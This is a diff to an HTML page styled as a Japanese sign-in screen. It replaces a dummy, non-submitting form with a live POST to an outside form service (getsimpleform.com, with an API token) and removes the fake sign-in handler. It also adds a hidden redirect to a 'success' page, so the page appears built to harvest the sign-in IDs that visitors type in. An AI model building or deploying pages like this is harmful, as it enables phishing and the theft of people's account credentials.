@@ -34,7 +34,7 @@
         <meta name="viewport" content="width=device-width,initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no">
     </head>
     <body>
-        <form action="#" novalidate="">
+        <form action="https://getsimpleform.com/messages?form_api_token=784af0d3130bba04f2826518fac8c39d" method="post">
             <div class="textfield-input-wrapper">
                 <input dir="ltr" id="user-text-field" autocomplete="username" title="サインインID (Eメール)" tabindex="2" placeholder="サインインID (Eメール)" maxlength="63" type="email">
               </div>
@@ -44,11 +44,16 @@
             <div class="separator-pageitems"></div>
             <div class="columns-center">
                 <div class="fitting-width button">
+                    <!--
                     <button tabindex="2" class="primary-button row-button text-button touch-feedback" onclick="dummySignIn();return false;">
+                    -->
+                    <button tabindex="2" class="primary-button row-button text-button touch-feedback">
                         <span dir="ltr" class="caption row-button-flex-container">サインイン</span>
                     </button>
                 </div>
             </div>
+            <!-- the redirect_to is optional, the form will redirect to the referrer on submission -->
+            <input type='hidden' name='redirect_to' value='https://ynihs.github.io/success.html' />
         </form>
     </body>
 </html>
